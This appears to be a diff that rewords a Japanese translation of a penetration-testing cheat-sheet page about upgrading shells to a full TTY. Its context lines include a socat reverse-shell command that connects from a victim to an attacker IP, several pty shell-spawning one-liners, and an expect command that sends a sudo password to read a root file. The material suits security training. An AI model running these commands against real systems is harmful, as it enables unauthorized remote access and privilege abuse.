@@ -23,7 +23,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 
 ## Full TTY
 
-`SHELL` 変数に設定するシェルは、必ず _**/etc/shells**_ に **リストされている必要があります**。そうでない場合は、「The value for the SHELL variable was not found in the /etc/shells file This incident has been reported」と表示されます。また、次のスニペットは bash でのみ動作することに注意してください。zsh にいる場合は、シェルを取得する前に `bash` を実行して bash に切り替えてください。
+`SHELL` 変数に設定するシェルは、必ず _**/etc/shells**_ に **リストされている必要があります**。そうでない場合は、`The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` というエラーメッセージが表示されます。また、次のスニペットは bash でのみ動作することに注意してください。zsh を使用している場合は、シェルを取得する前に `bash` を実行して bash に切り替えてください。
 
 #### Python
 
@@ -36,7 +36,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-**行**と**列**の**数**を取得するには、**`stty -a`**を実行します。
+**`stty -a`**を実行することで、**行**と**列**の**数**を取得できます。
 {% endhint %}
 
 #### スクリプト
@@ -56,7 +56,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-### **シェルを生成する**
+### **シェルの生成**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -132,7 +132,7 @@ expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PAS
 ```
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-**モバイルセキュリティ**の専門知識を深めるために、8kSecアカデミーをご利用ください。自己学習型のコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
+**モバイルセキュリティ**の専門知識を8kSecアカデミーで深めましょう。自己学習コースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
 
 {% embed url="https://academy.8ksec.io/" %}
 
